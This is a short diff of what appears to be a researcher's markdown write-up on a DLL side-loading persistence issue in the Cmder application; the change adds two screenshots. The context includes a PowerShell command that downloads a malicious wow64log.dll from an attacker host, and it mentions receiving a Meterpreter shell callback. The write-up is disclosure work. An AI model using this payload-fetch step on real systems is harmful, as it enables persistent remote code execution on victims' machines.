@@ -31,7 +31,11 @@ iwr http://kali.space:8000/wow64log.dll -o wow64log.dll
 - Upon opening the application we will recieve a call back.
 - From testing your Meterpreter shell will drop you into `C:\Windows` and your pid will be associated to `rundll32.exe`
 ## Privilege Escalation
-- From testing if the Cmder application is run without Administrator permissions 
+- From testing if the Cmder application is run without Administrator permissions
+
+![image](https://github.com/user-attachments/assets/df922eee-615b-40a2-858f-1e9a1eaed4fd)
+
+![image](https://github.com/user-attachments/assets/a1d8e088-1b7c-4613-a1d3-9695238a939a)
 
 ## Notes
 - It should be noted that an attacker would require Administrator permissions in order to take advantage of this vulnerability. This is due to the missing DLL being located under `System32`. While this technique does not allow an attacker to priviledge escalate it does provide a potential persistance mechanism. This DLL Side Loading issue allows an attacker to gain code execution anytime the application Cmder is opened.
